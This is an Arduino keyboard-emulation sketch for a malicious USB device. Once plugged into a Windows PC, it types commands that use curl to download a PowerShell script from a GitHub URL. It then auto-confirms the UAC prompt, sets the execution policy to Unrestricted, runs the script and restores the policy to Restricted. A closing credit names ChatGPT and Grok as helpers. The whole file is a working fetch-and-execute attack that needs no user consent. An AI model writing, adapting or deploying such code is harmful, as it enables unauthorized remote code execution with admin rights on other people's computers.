#include <Keyboard.h>

// Timing constants
const int BOOT_DELAY_MS = 8500;     // delay after plug-in before starting
const int AFTER_NOTEPAD_MS = 1500;  // wait for Notepad/PowerShell to open fully
const int CHAR_DELAY_MS = 10;       // delay between characters
const int LINE_DELAY_MS = 220;      // pause after each line (optional, handled in typeSlow)
const int UAC_DELAY_MS = 1500;      // delay for UAC dialog to appear
const int UAC_KEY_DELAY_MS = 100;   // delay between UAC key presses

void typeSlow(const char *s) {
  for (size_t i = 0; s[i] != '\0'; ++i) {
    if (s[i] == '\n') {
      Keyboard.write(KEY_RETURN);  // translate newline to Enter
      delay(LINE_DELAY_MS);        // optional small pause between lines
    } else {
      Keyboard.write(s[i]);
      delay(CHAR_DELAY_MS);
    }
  }
}

void handleUAC() {
  delay(UAC_DELAY_MS);  // Wait for UAC dialog
  Keyboard.write(KEY_TAB);
  delay(UAC_KEY_DELAY_MS);
  Keyboard.write(KEY_TAB);
  delay(UAC_KEY_DELAY_MS);
  Keyboard.write(KEY_RETURN);
  delay(500);  // Brief pause after confirmation for window to focus
}

void setup() {
  delay(BOOT_DELAY_MS);
  Keyboard.begin();

  // Open Run dialog (Win+R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(350);

  // Clear any existing text: Ctrl + A, then Delete
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.write('a');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.write(KEY_DELETE);
  delay(50);

  // Launch PowerShell (or change to "notepad")
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);

  delay(AFTER_NOTEPAD_MS);         // ensure window is ready

  // Type entire hacker-style message in one go
  typeSlow("curl -L -o \"C:\\Users\\%USERNAME%\\Downloads\\sticker.ps1\" \"https://raw.githubusercontent.com/AnhMeo/Sticker/refs/heads/main/Sticker.ps1\"");
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
   Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  Keyboard.releaseAll();

  // Open Run dialog (Win+R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(350);

  // Clear any existing text: Ctrl + A, then Delete
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.write('a');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.write(KEY_DELETE);
  delay(50);

  // Launch PowerShell as admin
  typeSlow("powershell");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  handleUAC();

  delay(AFTER_NOTEPAD_MS);         // ensure window is ready

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(60);
  typeSlow("Set-ExecutionPolicy Unrestricted");
  Keyboard.write(KEY_RETURN);
  delay(60);
  Keyboard.print("A");
  Keyboard.write(KEY_RETURN);
  Keyboard.print("exit");
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(350);

  // Clear any existing text: Ctrl + A, then Delete
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.write('a');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.write(KEY_DELETE);
  delay(50);

  // Launch PowerShell (or change to "notepad")
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(AFTER_NOTEPAD_MS);         // ensure window is ready

  // Type entire hacker-style message in one go
  typeSlow("& \"$env:USERPROFILE\\Downloads\\sticker.ps1\"");
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  Keyboard.releaseAll();

  // Open Run dialog (Win+R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(350);

  // Clear any existing text: Ctrl + A, then Delete
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.write('a');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.write(KEY_DELETE);
  delay(50);

  // Launch PowerShell as admin
  Keyboard.print("powershell");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  handleUAC();

  delay(AFTER_NOTEPAD_MS);         // ensure window is ready

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(20);
  typeSlow("Set-ExecutionPolicy Restricted");
  Keyboard.write(KEY_RETURN);
  delay(50);
  Keyboard.print("A");
  Keyboard.write(KEY_RETURN);
  Keyboard.print("exit");
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
  // nothing
}

// Prepared with care by Christian Taylor, Joshua Macian, and Benjamin Petrini, with the assistance of ChatGPT and Grok